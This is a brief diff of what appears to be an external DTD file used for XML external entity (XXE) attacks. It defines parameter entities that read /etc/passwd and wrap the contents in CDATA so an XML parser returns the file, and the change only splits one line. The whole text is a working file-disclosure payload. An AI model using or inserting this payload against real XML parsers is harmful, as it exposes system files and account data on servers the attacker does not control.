@@ -1,4 +1,5 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY contents '%start;%file;%end;'>">
+<!ENTITY % all "<!ENTITY contents 
+'%start;%file;%end;'>">
